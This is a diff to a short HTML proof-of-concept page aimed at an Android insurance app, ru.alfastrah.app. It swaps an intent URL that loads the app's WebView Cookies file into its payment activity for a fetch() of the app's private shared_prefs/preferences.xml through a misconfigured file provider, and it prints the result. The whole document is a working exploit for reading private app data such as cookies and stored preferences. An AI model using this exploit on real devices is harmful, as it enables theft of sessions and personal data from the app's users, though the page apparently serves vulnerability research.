@@ -1,7 +1,13 @@
 <html>
 <body>
+<pre id="out">Loading...</pre>
 <script>
-location.href = "intent:#Intent;component=ru.alfastrah.app/.ui.fragment.WebViewPaymentActivity;S.key_url=content://ru.alfastrah.app.easyphotopicker.fileprovider/root/data/data/ru.alfastrah.app/app_webview/Default/Cookies;end";
+fetch('content://ru.alfastrah.app.easyphotopicker.fileprovider/root/data/data/ru.alfastrah.app/shared_prefs/preferences.xml')
+.then(r => r.text())
+.then(t => {
+  document.getElementById('out').innerText = 'SUCCESS:\n' + t;
+})
+.catch(e => document.getElementById('out').innerText = 'BLOCKED: ' + e);
 </script>
 </body>
 </html>
